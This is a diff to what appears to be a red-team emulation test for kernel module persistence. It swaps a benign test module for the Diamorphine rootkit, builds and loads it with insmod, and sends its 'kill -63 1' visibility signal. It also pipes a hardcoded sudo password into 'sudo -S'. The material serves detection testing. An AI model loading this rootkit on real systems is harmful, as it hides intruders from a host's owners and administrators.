@@ -1,15 +1,19 @@
 Elevation Required;
 #pre
-if [ ! -d /tmp/T1547.006 ]; then mkdir /tmp/T1547.006; touch /tmp/T1547.006/safe_to_delete; fi;
-cp /home/ubuntu/atomic-red-team-master/atomics/T1547.006/src/* /tmp/T1547.006/
-cd /tmp/T1547.006; make
+echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install zip gcc make) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y zip gcc make))'
+cd /tmp
+unzip Diamorphine-master.zip
+cd Diamorphine-master
+make clean
+make
 #command
-if [ ! -f /tmp/T1547.006/T1547006.ko ]; then exit ; fi;
-sudo insmod /tmp/T1547.006/T1547006.ko
+insmod /tmp/Diamorphine-master/diamorphine.ko
 #check
-echo "lsmod:"
-lsmod | grep T1547006
-if [ -z "$(lsmod | grep T1547006)" ]; then echo "No such file or directory"; else echo "Load Kernel Module via insmod success"; fi;
+echo "使用insmod插入恶意内核模块diamorphine.ko："
+kill -63 1
+lsmod | grep diamorphine
+if [ -z "$(lsmod | grep diamorphine)" ]; then echo "No such file or directory"; else echo "<Load Kernel Module via insmod success>"; fi;
 #cleanup
-sudo rmmod T1547006
-[ -f /tmp/T1547.006/safe_to_delete ] && rm -rf /tmp/T1547.006
+sudo rmmod diamorphine
+rm -rf /tmp/Diamorphine-master
+rm -f /tmp/Diamorphine-master.zip
